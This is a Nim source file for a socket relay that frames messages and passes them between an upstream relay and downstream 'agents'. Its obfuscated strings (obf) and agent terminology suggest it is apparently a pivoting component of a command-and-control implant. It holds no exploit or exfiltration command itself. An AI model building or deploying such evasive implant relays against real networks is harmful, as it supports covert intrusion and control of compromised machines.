import net, nativesockets, strutils, json, times
import relay_protocol
import ../../util/[crypto, strenc]

const
    MAX_MESSAGE_SIZE* = 1024 * 1024  # 1MB max message size - prevents memory exhaustion
    HEADER_SIZE = 4  # 4 bytes for message length

type
    RelayConnection* = object
        socket*: Socket
        isConnected*: bool
        remoteHost*: string
        remotePort*: int
    
    RelayServer* = object
        socket*: Socket
        port*: int
        isListening*: bool
        connections*: seq[RelayConnection]

# Safe function to parse 4 bytes into uint32 (little endian)
proc parseUint32LE(bytes: string): uint32 =
    if bytes.len != 4:
        return 0
    
    result = uint32(ord(bytes[0])) or
             (uint32(ord(bytes[1])) shl 8) or
             (uint32(ord(bytes[2])) shl 16) or
             (uint32(ord(bytes[3])) shl 24)

# Safe function to encode uint32 into 4 bytes (little endian)
proc encodeUint32LE(value: uint32): string =
    result = newString(4)
    result[0] = char(value and 0xFF)
    result[1] = char((value shr 8) and 0xFF)
    result[2] = char((value shr 16) and 0xFF)
    result[3] = char((value shr 24) and 0xFF)

# Create relay connection to upstream relay
proc connectToRelay*(host: string, port: int): RelayConnection =
    result.remoteHost = host
    result.remotePort = port
    result.isConnected = false
    
    try:
        result.socket = newSocket()
        result.socket.connect(host, Port(port))
        result.isConnected = true
        
        when defined verbose:
            echo obf("[DEBUG]: Connected to relay at ") & host & ":" & $port
    except:
        result.isConnected = false
        when defined verbose:
            echo obf("[DEBUG]: Failed to connect to relay at ") & host & ":" & $port

# Start relay server for downstream agents
proc startRelayServer*(port: int): RelayServer =
    result.port = port
    result.isListening = false
    result.connections = @[]
    
    when defined debug:
        echo obf("[RELAY] Attempting to start relay server on port ") & $port
    
    try:
        result.socket = newSocket()
        result.socket.setSockOpt(OptReuseAddr, true)
        result.socket.bindAddr(Port(port))
        result.socket.listen()
        result.isListening = true
        
        when defined debug:
            echo obf("[RELAY] Relay server successfully listening on port ") & $port
    except:
        result.isListening = false
        when defined debug:
            echo obf("[RELAY] Failed to start relay server on port ") & $port & obf(": ") & getCurrentExceptionMsg()

# Accept new downstream connection (NON-BLOCKING)
proc acceptConnection*(server: var RelayServer): RelayConnection =
    result.isConnected = false
    
    if not server.isListening:
        when defined debug:
            echo obf("[RELAY] Server not listening, cannot accept connection")
        return
    
    try:
        when defined debug:
            echo obf("[RELAY] acceptConnection: Attempting to accept new connection")
        
        var clientSocket: Socket
        server.socket.accept(clientSocket)
        result.socket = clientSocket
        result.isConnected = true
        result.remoteHost = ""  # Will be filled by client registration
        result.remotePort = 0
        
        # Only add if we don't already have this connection
        server.connections.add(result)
        
        when defined debug:
            echo obf("[RELAY] Accepted new downstream connection, total connections: ") & $server.connections.len
    except:
        let errorMsg = getCurrentExceptionMsg()
        if "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
            result.isConnected = false
            when defined debug:
                echo obf("[RELAY] Failed to accept connection: ") & errorMsg
        else:
            # No connections waiting - normal for non-blocking
            result.isConnected = false
            when defined debug:
                echo obf("[RELAY] No connections waiting (non-blocking): ") & errorMsg

# Send message through connection
proc sendMessage*(conn: var RelayConnection, msg: RelayMessage): bool =
    if not conn.isConnected:
        return false
    
    try:
        let serializedMsg = serialize(msg)
        let msgLength = uint32(serializedMsg.len)
        
        # Validate message size before sending
        if msgLength > MAX_MESSAGE_SIZE:
            when defined debug:
                echo obf("[RELAY] Message too large: ") & $msgLength & obf(" bytes, max allowed: ") & $MAX_MESSAGE_SIZE
            return false
        
        when defined debug:
            echo obf("[RELAY] Sending message of length: ") & $msgLength
        
        # Send message length first (4 bytes) - using safe encoding
        let lengthHeader = encodeUint32LE(msgLength)
        conn.socket.send(lengthHeader)
        
        # Send message data
        conn.socket.send(serializedMsg)
        
        when defined verbose:
            echo obf("[DEBUG]: Sent message type ") & $msg.msgType & obf(" to ") & conn.remoteHost
        
        return true
    except:
        conn.isConnected = false
        when defined verbose:
            echo obf("[DEBUG]: Failed to send message, connection lost")
        return false

# Receive message from connection
proc receiveMessage*(conn: var RelayConnection): RelayMessage =
    if not conn.isConnected:
        when defined debug:
            echo obf("[RELAY] Cannot receive message, connection not active")
        return
    
    try:
        # Receive message length first (4 bytes) - SECURE VERSION
        var lengthBuffer = newString(HEADER_SIZE)
        let bytesRead = conn.socket.recv(lengthBuffer, HEADER_SIZE)
        
        if bytesRead != HEADER_SIZE:
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] Failed to receive message length, got ") & $bytesRead & obf(" bytes, expected ") & $HEADER_SIZE
            return
        
        # Parse length safely - NO MORE UNSAFE CAST!
        let msgLength = parseUint32LE(lengthBuffer)
               
        if msgLength == 0:
            when defined debug:
                echo obf("[RELAY] Invalid message length: 0")
            conn.isConnected = false
            return
        
        if msgLength > MAX_MESSAGE_SIZE:
            when defined debug:
                echo obf("[RELAY] Message too large: ") & $msgLength & obf(" bytes, max allowed: ") & $MAX_MESSAGE_SIZE
            conn.isConnected = false  # Disconnect malicious client
            return
        
        when defined debug:
            echo obf("[RELAY] Receiving message of length: ") & $msgLength & obf(" bytes")
        
        # Receive message data - now safe with validated length
        var msgBuffer = newString(int(msgLength))
        let msgBytesRead = conn.socket.recv(msgBuffer, int(msgLength))
        
        if msgBytesRead != int(msgLength):
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] Failed to receive full message, got ") & $msgBytesRead & obf(" of ") & $msgLength & obf(" bytes")
            return
        
        result = deserialize(msgBuffer)
        
        when defined debug:
            echo obf("[RELAY] Received message type ") & $result.msgType & obf(" from ") & result.fromID
            
    except:
        conn.isConnected = false
        when defined debug:
            echo obf("[RELAY] Failed to receive message: ") & getCurrentExceptionMsg()

# Close connection
proc closeConnection*(conn: var RelayConnection) =
    if conn.isConnected:
        try:
            conn.socket.close()
        except:
            discard
        conn.isConnected = false

# Close relay server
proc closeRelayServer*(server: var RelayServer) =
    if server.isListening:
        try:
            # Close all client connections
            for conn in server.connections.mitems:
                closeConnection(conn)
            server.connections = @[]
            
            # Close server socket
            server.socket.close()
        except:
            discard
        server.isListening = false

# Poll for incoming messages (NON-BLOCKING)
proc pollMessages*(conn: var RelayConnection, timeout: int = 100): seq[RelayMessage] =
    result = @[]
    
    if not conn.isConnected:
        when defined debug:
            echo obf("[RELAY] pollMessages: Connection not active")
        return
    
    try:
        when defined debug:
            echo obf("[RELAY] pollMessages: Setting socket to non-blocking mode")
        
        # Set socket to non-blocking mode
        setBlocking(conn.socket.getFd(), false)
        
        # Try to receive message length header (4 bytes)
        var lengthBuffer = newString(HEADER_SIZE)
        let bytesRead = conn.socket.recv(lengthBuffer, HEADER_SIZE)
        
        when defined debug:
            echo obf("[RELAY] pollMessages: Header recv returned ") & $bytesRead & obf(" bytes")
        
        if bytesRead == HEADER_SIZE:
            # We have a complete header, parse it
            let msgLength = parseUint32LE(lengthBuffer)
            
            when defined debug:
                echo obf("[RELAY] pollMessages: Message length: ") & $msgLength
            
            if msgLength > 0 and msgLength <= MAX_MESSAGE_SIZE:
                # Try to receive the full message
                var msgBuffer = newString(int(msgLength))
                let msgBytesRead = conn.socket.recv(msgBuffer, int(msgLength))
                
                when defined debug:
                    echo obf("[RELAY] pollMessages: Message recv returned ") & $msgBytesRead & obf(" of ") & $msgLength & obf(" bytes")
                
                if msgBytesRead == int(msgLength):
                    # Complete message received
                    let msg = deserialize(msgBuffer)
                    if validateMessage(msg):
                        when defined debug:
                            echo obf("[RELAY] pollMessages: Valid message received")
                        result.add(msg)
                else:
                    when defined debug:
                        echo obf("[RELAY] pollMessages: Incomplete message received")
            else:
                when defined debug:
                    echo obf("[RELAY] pollMessages: Invalid message length")
                conn.isConnected = false
        elif bytesRead == 0:
            # Connection closed
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] pollMessages: Connection closed by peer")
        else:
            # bytesRead < 0 means no data available (EAGAIN/EWOULDBLOCK) - normal for non-blocking
            when defined debug:
                echo obf("[RELAY] pollMessages: No data available (non-blocking)")
        
    except:
        let errorMsg = getCurrentExceptionMsg()
        if "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] pollMessages: Connection error: ") & errorMsg
        else:
            when defined debug:
                echo obf("[RELAY] pollMessages: No data available (exception): ") & errorMsg

# Poll relay server for new connections and messages (NON-BLOCKING)
proc pollRelayServer*(server: var RelayServer, timeout: int = 100): seq[RelayMessage] =
    result = @[]
    
    if not server.isListening:
        when defined debug:
            echo obf("[RELAY] Cannot poll server, not listening")
        return
    
    when defined debug:
        echo obf("[RELAY] Polling server with ") & $server.connections.len & obf(" connections")
    
    try:
        # Only try to accept new connections if we don't have any active connections
        # This prevents the "Bad file descriptor" error when connections already exist
        var hasActiveConnections = false
        for conn in server.connections:
            if conn.isConnected:
                hasActiveConnections = true
                break
        
        if not hasActiveConnections:
            # Try to accept new connections only if no active connections exist
            try:
                when defined debug:
                    echo obf("[RELAY] acceptConnection: Setting server socket to non-blocking mode")
                
                # Set server socket to non-blocking mode
                setBlocking(server.socket.getFd(), false)
                var newConn = acceptConnection(server)
                if newConn.isConnected:
                    when defined debug:
                        echo obf("[RELAY] New connection accepted during poll")
            except:
                let errorMsg = getCurrentExceptionMsg()
                if "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
                    when defined debug:
                        echo obf("[RELAY] Failed to accept connection: ") & errorMsg
                # No new connections available, that's normal for non-blocking
        
        # Check existing connections for messages (NON-BLOCKING)
        for i, conn in server.connections.mpairs:
            if conn.isConnected:
                when defined debug:
                    echo obf("[RELAY] Checking connection ") & $i & obf(" for messages")
                
                # READ ALL AVAILABLE MESSAGES from this connection
                var messagesRead = 0
                while true:
                    try:
                        # Set socket to non-blocking mode
                        setBlocking(conn.socket.getFd(), false)
                        
                        # Try to receive message length header (4 bytes)
                        var lengthBuffer = newString(HEADER_SIZE)
                        let bytesRead = conn.socket.recv(lengthBuffer, HEADER_SIZE)
                        
                        if bytesRead == HEADER_SIZE:
                            # We have a complete header, parse it
                            let msgLength = parseUint32LE(lengthBuffer)
                            
                            when defined debug:
                                echo obf("[RELAY] Connection ") & $i & obf(" message length: ") & $msgLength
                            
                            if msgLength > 0 and msgLength <= MAX_MESSAGE_SIZE:
                                # Try to receive the full message
                                var msgBuffer = newString(int(msgLength))
                                let msgBytesRead = conn.socket.recv(msgBuffer, int(msgLength))
                                
                                if msgBytesRead == int(msgLength):
                                    # Complete message received
                                    let msg = deserialize(msgBuffer)
                                    if validateMessage(msg):
                                        messagesRead += 1
                                        when defined debug:
                                            echo obf("[RELAY] Valid message received from connection ") & $i & obf(" (message #") & $messagesRead & obf(", type: ") & $msg.msgType & obf(")")
                                        result.add(msg)
                                        # Continue reading more messages from this connection
                                        continue
                                else:
                                    when defined debug:
                                        echo obf("[RELAY] Incomplete message from connection ") & $i
                                    break  # Exit loop, connection has issues
                            else:
                                when defined debug:
                                    echo obf("[RELAY] Invalid message length from connection ") & $i
                                conn.isConnected = false
                                break  # Exit loop, connection is bad
                        elif bytesRead == 0:
                            # Connection closed
                            conn.isConnected = false
                            when defined debug:
                                echo obf("[RELAY] Connection ") & $i & obf(" closed by peer")
                            break  # Exit loop, connection closed
                        else:
                            # bytesRead < 0 means no data available (EAGAIN/EWOULDBLOCK) - normal for non-blocking
                            when defined debug:
                                if messagesRead > 0:
                                    echo obf("[RELAY] Connection ") & $i & obf(" no more data, read ") & $messagesRead & obf(" messages total")
                            break  # Exit loop, no more data available
                        
                    except:
                        # Connection error or no data available
                        let errorMsg = getCurrentExceptionMsg()
                        if "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
                            conn.isConnected = false
                            when defined debug:
                                echo obf("[RELAY] Connection ") & $i & obf(" error: ") & errorMsg
                        else:
                            when defined debug:
                                if messagesRead > 0:
                                    echo obf("[RELAY] Connection ") & $i & obf(" no more data available, read ") & $messagesRead & obf(" messages total")
                        break  # Exit loop, no more data or connection error
            else:
                when defined debug:
                    echo obf("[RELAY] Connection ") & $i & obf(" is not active")
        
    except:
        when defined debug:
            echo obf("[RELAY] Error during server poll: ") & getCurrentExceptionMsg()

# Broadcast message to all downstream connections
proc broadcastMessage*(server: var RelayServer, msg: RelayMessage): int =
    result = 0
    
    for conn in server.connections.mitems:
        if conn.isConnected:
            if sendMessage(conn, msg):
                result += 1

# Send message to specific downstream connection by agent ID
proc sendToAgent*(server: var RelayServer, agentID: string, msg: RelayMessage): bool =
    # This would require maintaining agent ID to connection mapping
    # For now, broadcast and let agents filter
    let sent = broadcastMessage(server, msg)
    result = sent > 0

# Clean up dead connections
proc cleanupConnections*(server: var RelayServer) =
    var activeConnections: seq[RelayConnection] = @[]
    
    for conn in server.connections:
        if conn.isConnected:
            activeConnections.add(conn)
        else:
            when defined verbose:
                echo obf("DEBUG: Removed dead connection")
    
    server.connections = activeConnections

# Get connection statistics
proc getConnectionStats*(server: RelayServer): tuple[listening: bool, connections: int] =
    result.listening = server.isListening
    result.connections = 0
    
    for conn in server.connections:
        if conn.isConnected:
            result.connections += 1 